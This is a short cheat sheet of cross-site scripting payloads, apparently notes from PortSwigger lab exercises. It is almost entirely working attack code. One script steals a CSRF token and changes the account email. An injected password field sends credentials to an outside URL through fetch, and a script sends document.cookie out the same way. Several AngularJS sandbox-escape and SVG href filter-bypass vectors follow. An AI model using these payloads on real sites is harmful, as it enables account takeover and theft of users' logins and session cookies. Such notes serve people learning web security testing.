# XSS

- Csrf token stealing
    
    ```jsx
    <script>
    var req = new XMLHttpRequest();  // assigning new variable for http request
    req.onload = change_email; // When request is processing start "change_email" funciton
    req.open('get', '/my-account', true);
    req.send();
    function change_email() {
    		var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    		var newreq = new XMLHttpRequest();
    		newreq.open('post', '/my-account/change-email', true);
    		newreq.send('csrf='+csrf_token+'&email=test@test.com')
    };
    </script>
    
    // Authorized by portswigger
    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>
    ```
    
- Credentials stealing
    
    ```jsx
    <input> id=username name=username>
    <input> id=password name=password type=password 
    onchange='if(this.value.length)
    fetch("<url>?username="+username.value+"&password="+this.value)'>
    ```
    
- Cookies stealing
    
    ```jsx
    <script>
    fetch('<url>?cookie='+document.cookie);
    </script>
    ```
    
- Reflected XSS with AngularJS sandbox escape without strings
    
    ```jsx
    toString().constructor.prototype.charAt=[].join;  // This will change charAt function's property to .join function | CharAt function's work is exactly opposite of .join function but this line will change that and equal it to .join function | CharAt function is used in detection of malicious strings in sandbox .
    
    [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) // This line telling javascript to sort that list [1,2] on the basis of give code in orderBy | Given digits are in decibal format and it will by that function converts into x=alert(1)
    ```
    
- **Reflected XSS with AngularJS sandbox escape and CSP**
    
    ```jsx
    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
    ```
    
- **Reflected XSS with event handlers and `href` attributes blocked**
    
    ```jsx
    <svg><a><animate attributeName='href' values='javascript:alert(1)'/><text x='20' y='35'>Click me</a></svg>
    ```